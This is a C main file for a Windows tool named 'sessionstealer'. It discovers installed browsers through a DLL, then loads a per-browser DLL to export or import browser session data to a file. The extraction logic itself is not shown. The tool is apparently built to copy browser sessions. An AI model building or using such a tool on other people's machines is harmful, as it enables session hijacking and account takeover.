#include "sessionstealer/version.h"
#include "sessionstealer/cli_args.h"
#include "sessionstealer/utils.h"
#include "sessionstealer/dll_loader.h"
#include "dlls/discovery/discovery.h"
#include "dlls/chromium/chromium.h"

#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <windows.h>


int main(int argc, char *argv[]) {
    cli_args_t args = create_cli_args();
    cli_args_action_t action = parse_cli_args(argc, argv, &args);

    if (action == CLI_ACTION_EXIT)
        return EXIT_SUCCESS;
    if (action == CLI_ACTION_INVALID)
        return EXIT_FAILURE;

    HMODULE hLib = LoadLibraryA("discovery.dll");
    if (!hLib) {
        printf("Failed to load discovery.dll\n");
        return 1;
    }

    discover_browsers_fn discover_browsers_dll = (discover_browsers_fn)GetProcAddress(hLib, "discover_browsers");
    if (!discover_browsers_dll) {
        printf("Failed to find discover_browsers in DLL\n");
        FreeLibrary(hLib);
        return 1;
    }

    discovery_browser_list_t discovered_browsers = discover_browsers_dll();
    FreeLibrary(hLib);

    if (discovered_browsers.length < 1) {
        printf("No browsers discovered\n");
    }

    discovery_browser_t *selected_browser = pick_browser(&discovered_browsers, args.browser);
    if (selected_browser == NULL) {
        return EXIT_FAILURE;
    }

    const char *selected_browser_dll_name = find_dll_browser(selected_browser->browser_name);
    if (!selected_browser_dll_name) {
        printf("Dll for selected browser was not found, install %s\n", browser_map_dll[selected_browser->browser_name]);
        return EXIT_FAILURE;
    }
    
    HMODULE hBrowserLib = LoadLibraryA(selected_browser_dll_name);
    if (!hBrowserLib) {
        DWORD err = GetLastError();
        printf("Couldn't load %s. Error code: %lu\n", selected_browser_dll_name, err);
        return EXIT_FAILURE;
    }
    
    const char *func_name = args.command == CLI_COMMAND_EXPORT ? "export_browser" : "import_browser";
    browser_dll_fn browser_command = (browser_dll_fn)GetProcAddress(hBrowserLib, func_name);

    int result = browser_command(selected_browser, args.file);

    return result;
}
